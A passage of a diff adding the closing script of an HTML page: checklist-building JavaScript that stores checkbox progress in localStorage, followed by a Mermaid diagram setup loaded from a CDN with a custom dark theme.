+    txt.textContent=n+' / '+total;
+  }
+  function save(){try{localStorage.setItem(KEY,JSON.stringify(state));}catch(e){}}
+  function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;');}
+  data.forEach(function(g,gi){
+    var det=document.createElement('details'); det.className='chk'; if(gi<1)det.open=true;
+    var sum=document.createElement('summary');
+    var done=g[1].filter(function(_,ii){return state[gi+'-'+ii];}).length;
+    sum.innerHTML=esc(g[0])+'<span class="mini">'+done+'/'+g[1].length+'</span>';
+    det.appendChild(sum);
+    var ul=document.createElement('ul');
+    g[1].forEach(function(item,ii){
+      var id=gi+'-'+ii;
+      var li=document.createElement('li');
+      var lab=document.createElement('label');
+      var cb=document.createElement('input'); cb.type='checkbox'; cb.checked=!!state[id];
+      var sp=document.createElement('span'); sp.textContent=item;
+      cb.addEventListener('change',function(){
+        state[id]=cb.checked; save(); updateProg();
+        var d=g[1].filter(function(_,x){return state[gi+'-'+x];}).length;
+        sum.querySelector('.mini').textContent=d+'/'+g[1].length;
+      });
+      lab.appendChild(cb); lab.appendChild(sp); li.appendChild(lab); ul.appendChild(li);
+    });
+    det.appendChild(ul); mount.appendChild(det);
+  });
+  document.getElementById('chk-reset').addEventListener('click',function(){
+    state={}; save();
+    mount.querySelectorAll('input[type=checkbox]').forEach(function(cb){cb.checked=false;});
+    mount.querySelectorAll('.chk').forEach(function(det,gi){
+      det.querySelector('.mini').textContent='0/'+data[gi][1].length;
+    });
+    updateProg();
+  });
+  updateProg();
+})();
+</script>
+
+<script type="module">
+import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs";
+mermaid.initialize({
+  startOnLoad:true, theme:"base", securityLevel:"strict",
+  themeVariables:{
+    fontFamily:'"IBM Plex Mono", monospace', fontSize:"13px",
+    background:"#0F1E24", primaryColor:"#132831", primaryTextColor:"#EDF5F5",
+    primaryBorderColor:"#1E3B47", lineColor:"#4FC3D9", secondaryColor:"#0F1E24",
+    tertiaryColor:"#0A1418", clusterBkg:"#0A1418", clusterBorder:"#1E3B47",
+    edgeLabelBackground:"#0A1418", actorBkg:"#132831", actorBorder:"#F2A03D",
+    actorTextColor:"#EDF5F5", signalColor:"#9DB6BF", signalTextColor:"#CFE6EC",
+    labelBoxBkgColor:"#132831", labelBoxBorderColor:"#1E3B47",
+    noteBkgColor:"#132831", noteTextColor:"#EDF5F5"
+  }
+});
+</script>
+</body>
+</html>
